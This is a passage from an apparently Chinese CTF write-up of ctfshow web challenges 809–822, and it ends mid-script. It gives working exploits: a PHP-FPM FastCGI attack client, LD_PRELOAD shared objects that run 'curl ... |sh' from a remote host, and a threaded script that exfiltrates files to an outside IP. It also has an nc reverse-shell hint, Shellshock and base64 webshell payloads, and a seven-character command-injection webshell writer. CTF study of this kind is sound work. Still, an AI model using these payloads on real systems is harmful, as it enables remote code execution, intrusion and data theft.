src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524212116036.png" alt="image-20220524212116036"></p><p>我们的可以利用pear中的config-create命令，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><blockquote><p>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/hello.php</p><p>目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p></blockquote><p>用bp发包把我们的一句话木马写进去，然后访问就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213125023.png" alt="image-20220524213125023"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213116263.png" alt="image-20220524213116263"></p><h2 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h2><p><strong>SSRF打PHP-FPM</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233127483.png" alt="image-20220524233127483"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233113854.png" alt="image-20220524233113854"></p><h2 id="web811"><a href="#web811" class="headerlink" title="web811"></a>web811</h2><p><strong>file_put_contents打PHP-FPM</strong></p><p>参考陇原战役的复现</p><p>有点要注意的是这里用bash弹不出来，要用nc ip port -e /bin/sh</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524225414567.png" alt="image-20220524225414567"></p><h2 id="web812"><a href="#web812" class="headerlink" title="web812"></a>web812</h2><p><strong>PHP-FPM未授权</strong></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p></blockquote><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525193643081.png" alt="image-20220525193643081"></p><p>可以结合php安装时带的php文件来执行</p><p>例如/usr/local/lib/php/OS/Guess.php</p><p>脚本</p><pre class="language-php" data-language="php"><code class="language-php">import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https:&#x2F;&#x2F;github.com&#x2F;wuyunfeng&#x2F;Python-FastCGI-ClientPY2 &#x3D; True if sys.version_info.major &#x3D;&#x3D; 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s &#x3D; str(s, &#39;utf-8&#39;, &#39;strict&#39;)    else:        s &#x3D; str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION &#x3D; 1    __FCGI_ROLE_RESPONDER &#x3D; 1    __FCGI_ROLE_AUTHORIZER &#x3D; 2    __FCGI_ROLE_FILTER &#x3D; 3    __FCGI_TYPE_BEGIN &#x3D; 1    __FCGI_TYPE_ABORT &#x3D; 2    __FCGI_TYPE_END &#x3D; 3    __FCGI_TYPE_PARAMS &#x3D; 4    __FCGI_TYPE_STDIN &#x3D; 5    __FCGI_TYPE_STDOUT &#x3D; 6    __FCGI_TYPE_STDERR &#x3D; 7    __FCGI_TYPE_DATA &#x3D; 8    __FCGI_TYPE_GETVALUES &#x3D; 9    __FCGI_TYPE_GETVALUES_RESULT &#x3D; 10    __FCGI_TYPE_UNKOWNTYPE &#x3D; 11    __FCGI_HEADER_SIZE &#x3D; 8    # request state    FCGI_STATE_SEND &#x3D; 1    FCGI_STATE_ERROR &#x3D; 2    FCGI_STATE_SUCCESS &#x3D; 3    def __init__(self, host, port, timeout, keepalive):        self.host &#x3D; host        self.port &#x3D; port        self.timeout &#x3D; timeout        if keepalive:            self.keepalive &#x3D; 1        else:            self.keepalive &#x3D; 0        self.sock &#x3D; None        self.requests &#x3D; dict()    def __connect(self):        self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock &#x3D; None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length &#x3D; len(content)        buf &#x3D; bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \               + bchr(requestid &amp; 0xFF) \               + bchr((length &gt;&gt; 8) &amp; 0xFF) \               + bchr(length &amp; 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen &#x3D; len(name)        vLen &#x3D; len(value)        record &#x3D; b&#39;&#39;        if nLen &lt; 128:            record +&#x3D; bchr(nLen)        else:            record +&#x3D; bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record +&#x3D; bchr(vLen)        else:            record +&#x3D; bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header &#x3D; dict()        header[&#39;version&#39;] &#x3D; bord(stream[0])        header[&#39;type&#39;] &#x3D; bord(stream[1])        header[&#39;requestId&#39;] &#x3D; (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#39;contentLength&#39;] &#x3D; (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#39;paddingLength&#39;] &#x3D; bord(stream[6])        header[&#39;reserved&#39;] &#x3D; bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header &#x3D; buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record &#x3D; self.__decodeFastCGIHeader(header)            record[&#39;content&#39;] &#x3D; b&#39;&#39;                        if &#39;contentLength&#39; in record.keys():                contentLength &#x3D; int(record[&#39;contentLength&#39;])                record[&#39;content&#39;] +&#x3D; buffer.read(contentLength)            if &#39;paddingLength&#39; in record.keys():                skiped &#x3D; buffer.read(int(record[&#39;paddingLength&#39;]))            return record    def request(self, nameValuePairs&#x3D;&#123;&#125;, post&#x3D;&#39;&#39;):        if not self.__connect():            print(&#39;connect failure! please check your fasctcgi-server !!&#39;)            return        requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] &#x3D; dict()        request &#x3D; b&quot;&quot;        beginFCGIRecordContent &#x3D; bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord &#x3D; b&#39;&#39;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name &#x3D; force_bytes(name)                value &#x3D; force_bytes(value)                paramsRecord +&#x3D; self.__encodeNameValueParams(name, value)        if paramsRecord:            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)        if post:            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)        self.sock.send(request)        self.requests[requestId][&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_SEND        self.requests[requestId][&#39;response&#39;] &#x3D; b&#39;&#39;        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data &#x3D; b&#39;&#39;        while True:            buf &#x3D; self.sock.recv(512)            if not len(buf):                break            data +&#x3D; buf        data &#x3D; BytesIO(data)        while True:            response &#x3D; self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_ERROR                if requestId &#x3D;&#x3D; int(response[&#39;requestId&#39;]):                    self.requests[requestId][&#39;response&#39;] +&#x3D; response[&#39;content&#39;]            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#39;response&#39;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Php-fpm code execution vulnerability client.&#39;)    parser.add_argument(&#39;host&#39;, help&#x3D;&#39;Target host, such as 127.0.0.1&#39;)    parser.add_argument(&#39;file&#39;, help&#x3D;&#39;A php file absolute path, such as &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;System.php&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help&#x3D;&#39;What php code your want to execute&#39;, default&#x3D;&#39;&lt;?php phpinfo(); exit; ?&gt;&#39;)    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help&#x3D;&#39;FastCGI port&#39;, default&#x3D;9000, type&#x3D;int)    args &#x3D; parser.parse_args()    client &#x3D; FastCGIClient(args.host, args.port, 3, 0)    params &#x3D; dict()    documentRoot &#x3D; &quot;&#x2F;&quot;    uri &#x3D; args.file    content &#x3D; args.code    params &#x3D; &#123;        &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,        &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,        &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;&#x2F;&#39;),        &#39;SCRIPT_NAME&#39;: uri,        &#39;QUERY_STRING&#39;: &#39;&#39;,        &#39;REQUEST_URI&#39;: uri,        &#39;DOCUMENT_ROOT&#39;: documentRoot,        &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,        &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;REMOTE_PORT&#39;: &#39;9985&#39;,        &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;SERVER_PORT&#39;: &#39;80&#39;,        &#39;SERVER_NAME&#39;: &quot;localhost&quot;,        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;,        &#39;CONTENT_TYPE&#39;: &#39;application&#x2F;text&#39;,        &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content),        &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,        &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;    &#125;    response &#x3D; client.request(params, content)    print(force_text(response))</code></pre><p>用法：<br><code>python exp.py -c &#39;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#39; -p 28074 pwn.challenge.ctf.show /usr/local/lib/php/PEAR.php</code></p><p>端口改成自己的就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525195637988.png" alt="image-20220525195637988"></p><h2 id="web813"><a href="#web813" class="headerlink" title="web813"></a>web813</h2><p><strong>劫持mysqli</strong></p><blockquote><p>大致过程就是自己生成一个mysqli.so（mysqli的扩展），然后扩展里面有ctfshow这个函数。<br>题目调用ctfshow函数的时候就会去扩展里面找（php里面没有这个函数）。<br>可以采用<a href="https://www.php.net/releases/">php源码</a>中的<code>ext_skel.php</code>来生成。<br>一般在ext目录下。</p></blockquote><p>phpinfo中可以看默认扩展目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525214350144.png" alt="image-20220525214350144"></p><p>当php调用函数时，如果在注册函数中找不到就会去扩展目录中找<br>此时我们上传恶意so文件可以劫持函数</p><p><strong>恶意so为什么能绕过disable_function</strong></p><p>php disable_function禁用的是php函数，而恶意so中调用的是C语言库中的system函数</p><p><strong>编译so文件</strong></p><p><strong>ext_skel框架开发扩展</strong></p><p>ubuntu用apt按的话默认不安装，要自己按</p><p><a href="https://blog.csdn.net/DestinyLordC/article/details/79479769">https://blog.csdn.net/DestinyLordC/article/details/79479769</a></p><p>php ext_skel.php --ext ctfshow --std</p><p>在ctfshow.c里改两个地方</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525225654446.png" alt="image-20220525225654446"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525224854116.png" alt="image-20220525224854116"></p><pre class="language-txt" data-language="txt"><code class="language-txt">phpize.&#x2F;configuremake &amp;&amp; make install </code></pre><p>编译完成后能看见目录，也能在目录里看见我们编译好的so文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525230440261.png" alt="image-20220525230440261"></p><p>太怪了，没成功，有空再试吧</p><p><strong>利用条件</strong></p><p>1.扩展目录明确且可写</p><p>2.能够载入恶意so文件（重启php-fpm或者能使用php命令行）</p><p>3.有调用我们自定义函数的代码 shell_exec(&quot;php -r &#39;ctfshow();&#39; &quot;)</p><h2 id="web814"><a href="#web814" class="headerlink" title="web814"></a>web814</h2><p><strong>劫持getuid</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        system(&quot;whoami&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125;</code></pre><p><strong>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</strong></p><p>php启动<strong>新进程</strong>时，调用getuid来确认 进程属主(执行权限）</p><p><a href="https://www.anquanke.com/post/id/254388">有趣的 LD_PRELOAD - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="https://download.qingteng.cn/frontendcdn/2019/06/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-%E7%BB%95%E8%BF%87php%E7%9A%84disable_functions%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89.pdf">安全研究-绕过php的disable_functions（上篇）.pdf (qingteng.cn)</a></p><p>有下面这几个函数的时候就可以考虑利用LD_PRELOAD进行绕过disable_function</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526170114684.png" alt="image-20220526170114684"></p><p>编译同名函数进行劫持<br>注意进行unset(LD_PERLOAD)<br>避免进入死循环</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;uid_t getuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;        system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;int getuid()&#123;        if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;        unsetenv(&quot;LD_PRELOAD&quot;);        payload();&#125;</code></pre><p>gcc -shared -fPIC getuid.c -o getuid.so </p><p>然后上脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;5fce36f5-6270-4ea7-ac06-2ab0c6e1cd5a.challenge.ctf.show&#x2F;&quot;data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;getuid.so&#39;,&#39;content&#39;:open(&#39;getuid.so&#39;,&#39;rb&#39;).read()&#125;requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data)requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;getuid.so&#39;)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526165856011.png" alt="image-20220526165856011"></p><h2 id="web815"><a href="#web815" class="headerlink" title="web815"></a>web815</h2><p><strong>劫持构造器</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125;</code></pre><p>也可以用814的方法</p><p>但是这题是要用这种</p><pre class="language-c" data-language="c"><code class="language-c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void hack(void)&#123;unsetenv(&quot;LD_PRELOAD&quot;);system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;</code></pre><p>产生新进程即使用<br>通用劫持方法 不用比对不同的函数<br>劫持构造器<br>构造器能自定函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526172217311.png" alt="image-20220526172217311"></p><h2 id="web816"><a href="#web816" class="headerlink" title="web816"></a>web816</h2><p><strong>临时文件利用</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]);    system(&quot;echo ctfshow&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>没上传点，但是我们知道php上传的文件后会在tmp目录下产生一个临时文件，而这里</p><p>的scandir(&quot;/tmp&quot;)[2]就是我们上传的文件，所以让env=LD_PRELOAD=/tmp/就可以和815一样了</p><p>改改脚本就可以接着用了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526174525785.png" alt="image-20220526174525785"></p><h2 id="web817"><a href="#web817" class="headerlink" title="web817"></a>web817</h2><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\&#x2F;(\w+\&#x2F;?)+$&#x2F;&quot;, $file))&#123;shell_exec(shell_exec(&quot;cat $file&quot;));&#125;else&#123;system(&quot;ps aux&quot;);&#125;</code></pre><p>题目源码，都没个正常的web页面</p><p>题目里面的正则表达式大概意思就是以<code>/</code>开头，并且后面只能有数字字母和<code>/</code></p><p>我们需要在服务器上构造一个文件，并且文件内容是可控的，或者是服务器本身就有这样的文件也是可以的。<br>大概只能是构造一个临时文件，或者可以日志可控。</p><p>日志的话要有.log的后缀，所以只能想临时文件了</p><p><strong>利用nginx的body缓存机制</strong></p><p>nginx从请求的body体中每次默认读取一定量的字节，如果body字段大于这个字节（32位机器是8k，64位机器是16k），那么在下次读取时之前一部分的字节就会<strong>被存入一个临时文件中</strong></p><p>如果我们在发完前sleep几秒钟，那么就能很清楚的找到并且能够访问这些临时文件</p><p>默认文件的路径大致为</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003</code></pre><p>但是body缓存在nginx读取完，转发给php-fpm后就删除了，就是说在php解释执行之前就被删除了</p><p>这时候就要借助Linux特性了</p><p>Linux有一个文件描述符会将打开后删除了但是还没有关闭的文件存入/proc/PID/fd/{1}中（需要同一用户的操作。</p><p>而pid我们通过传一个不带参数的get请求就可以得到。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526181858962.png" alt="image-20220526181858962"></p><p>所以我们只要<strong>一边post传数据，一边遍历fd下的文件</strong></p><p>原理搞懂了，直接上羽师傅的脚本</p><pre class="language-python" data-language="python"><code class="language-python">import  threading, requestsimport socketimport report&#x3D; 28053s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1Host:127.0.0.1&#39;&#39;&#39;.encode())data&#x3D;s.recv(1024).decode()s.close()pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()print(pid)con&#x3D;&quot;curl http:&#x2F;&#x2F;101.34.94.44:4567?&#96;cat &#x2F;f*&#96;;&quot;+&#39;0&#39;*1024*500l &#x3D; len(con)def upload():while True:s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))x&#x3D;f&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1Content-Length: &#123;l&#125;Content-Type: application&#x2F;x-www-form-urlencodedConnection: close&#123;con&#125;&#39;&#39;&#39;.encode()s.send(x)s.close()def bruter():while True:for fd in range(3,40):print(fd)s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F;?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1Host: 127.0.0.1Connection: close&#39;&#39;&#39;.encode())print(s.recv(2048).decode())s.close()for i in range(30):    t &#x3D; threading.Thread(target&#x3D;upload)    t.start()for j in range(30):    a &#x3D; threading.Thread(target&#x3D;bruter)    a.start()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526182711985.png" alt="image-20220526182711985">（好卡啊</p><h2 id="web818"><a href="#web818" class="headerlink" title="web818"></a>web818</h2><pre class="language-php" data-language="php"><code class="language-php">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;putenv($env);system(&quot;echo ctfshow&quot;);&#125;else&#123;system(&quot;ps aux&quot;);&#125;···</code></pre><p>和817一样的原理，只不过把要传入的东西变成了恶意so文件</p><p>恶意文件用816那个就可以</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230108433.png" alt="image-20220526230108433"></p><p>（卡卡卡卡卡</p><h2 id="web819"><a href="#web819" class="headerlink" title="web819"></a>web819</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env);    system(&quot;whoami&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>没有 <em>ps</em> <em>aux</em> 来显示所有进程，要靠爆破pid显然不太显示</p><p>这里我们利用另一种漏洞。</p><p><strong>破壳漏洞</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230337557.png" alt="image-20220526230337557"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230658812.png" alt="image-20220526230658812"></p><p>感觉这就类似php的create_function函数的命令逃逸一样，利用结束符让这个函数提前结束然后在后面加上我们自己的命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231102728.png" alt="image-20220526231102728"></p><p>这里因为后边执行了whoami命令，我们就直接利用putenv修改whoami命令就行。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231157070.png" alt="image-20220526231157070"></p><p>最终payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; cat &#x2F;f*; &#125;</code></pre><h2 id="web820"><a href="#web820" class="headerlink" title="web820"></a>web820</h2><p>非常规的文件上传</p><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(strlen($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])&gt;0)&#123;    $filetype &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];    $tmpname &#x3D; $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];    $ef &#x3D; getimagesize($tmpname);    if( ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;) &amp;&amp; ($ef!&#x3D;false) &amp;&amp; ($ef[&#39;mime&#39;]&#x3D;&#x3D;&#39;image&#x2F;jpeg&#39;))&#123;        $content &#x3D; base64_decode(file_get_contents($tmpname));        file_put_contents(&quot;shell.php&quot;, $content);        echo &quot;file upload success!&quot;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>上传的文件内容被base64解码一次后再放进shell.php，而base64遇到不属于自己编码字符内的字符时会跳过，可以利用这个特性构造一个特殊的图片</p><p>群主构造的图片</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231808397.png" alt="image-20220526231808397"></p><p>里面的字符被base64解码后为</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;;?&gt;?</code></pre><p>也就是一个get型的一句话木马，参数是1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526232148797.png" alt="image-20220526232148797"></p><h2 id="web821"><a href="#web821" class="headerlink" title="web821"></a>web821</h2><p>七字符可写</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(strlen($cmd) &lt;&#x3D; 7)&#123;    shell_exec($cmd);&#125;</code></pre><p>直接上群主师傅的脚本就行了</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show&#x2F;&quot;payload&#x3D;[&quot;&gt;hp&quot;,&quot;&gt;1.p\\&quot;,&quot;&gt;d\\&gt;\\&quot;,&quot;&gt;\\ -\\&quot;,&quot;&gt;e64\\&quot;,&quot;&gt;bas\\&quot;,&quot;&gt;7\\|\\&quot;,&quot;&gt;XSk\\&quot;,&quot;&gt;Fsx\\&quot;,&quot;&gt;dFV\\&quot;,&quot;&gt;kX0\\&quot;,&quot;&gt;bCg\\&quot;,&quot;&gt;XZh\\&quot;,&quot;&gt;AgZ\\&quot;,&quot;&gt;waH\\&quot;,&quot;&gt;PD9\\&quot;,&quot;&gt;o\\ \\&quot;,&quot;&gt;ech\\&quot;,&quot;ls -t&gt;0&quot;,&quot;. 0&quot;]def writeFile(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;requests.post(url,data&#x3D;data)def run():for p in payload:writeFile(p.strip())print(&quot;[*] create &quot;+p.strip())time.sleep(1)def check():response &#x3D; requests.get(url+&quot;1.php&quot;)if response.status_code &#x3D;&#x3D; requests.codes.ok:print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)def main():run()check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()</code></pre><p>这个主要就是将一个get型的一句话木马，参数是1，写进了1.php</p><p>原理就是Linux中&gt;x可以生成一个文件名为x的文件</p><p>而. x又能执行shell命令</p><p>所以利用ls -t对文件按照时间进行排序之后存入0文件，再利用. 0来执行这些文件名构成的命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132006261.png" alt="image-20220527132006261"></p><p>题目提示flag在数据库里，用蚁剑连接</p><p>get转post</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132311936.png" alt="image-20220527132311936"></p><p>数据操作，然后弱口令登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132607438.png" alt="image-20220527132607438"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132632203.png" alt="image-20220527132632203"></p><h2 id="web822"><a href="#web822" class="headerlink" title="web822"></a>web822</h2><p>七字符不可写</p><p>和821一样的代码，但是没有了写入权限，这时候我们就要想利用临时文件了，比如/t*/*</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;a7276db0-6191-44d2-bbf9-c992009366b4.challenge.ctf.show&#x2F;&quot;def 